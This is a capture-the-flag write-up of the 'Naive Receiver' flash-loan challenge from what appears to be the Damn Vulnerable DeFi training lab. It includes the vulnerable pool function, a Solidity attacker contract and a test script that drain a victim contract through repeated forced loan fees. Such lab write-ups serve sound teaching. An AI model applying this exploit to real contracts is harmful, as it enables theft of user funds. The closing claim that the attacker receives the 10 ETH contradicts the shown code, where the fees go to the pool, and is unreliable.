# Challange #2 - Naive Receiver

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

<br />
This funcion allows users to borrow ETH from the pool. The pool will only send the ETH if the user’s contract has enough balance to pay the fee.

## [NaiveReceiverLenderPool.sol:](/CTF%20-%20Damn%20Vulnerable/contracts/naive-receiver/NaiveReceiverLenderPool.sol)
```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );

        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```

## [Attacker Contract](/CTF%20-%20Damn%20Vulnerable/contracts/attacker-contracts/AttackerNaiveReceiver.sol)

```solidity
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackerNaiveReceiver {
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function exploit(address victim) public {
        for (int i = 0; i < 10; i++) {
            pool.flashLoan(victim, 1 ether);
        }
    }
}
```

## [Exploit](/CTF%20-%20Damn%20Vulnerable/test/naive-receiver/naive-receiver.challenge.js)

```javascript
it("Exploit", async function () {
	const AttackerFactory = await ethers.getContractFactory(
		"AttackerNaiveReceiver",
		attacker
	);
	const attackContract = await AttackerFactory.deploy(this.pool.address);

	await attackContract.exploit(this.receiver.address);
});
```

## Explanation

The attacker contract calls the `flashLoan` function 10 times, each time borrowing 1 ETH. The `receiveEther` function of the receiver contract is called 10 times, each time paying 1 ETH fee. The receiver contract has 10 ETH in balance, so it can pay the fee 10 times. The attacker contract receives 10 ETH in total.
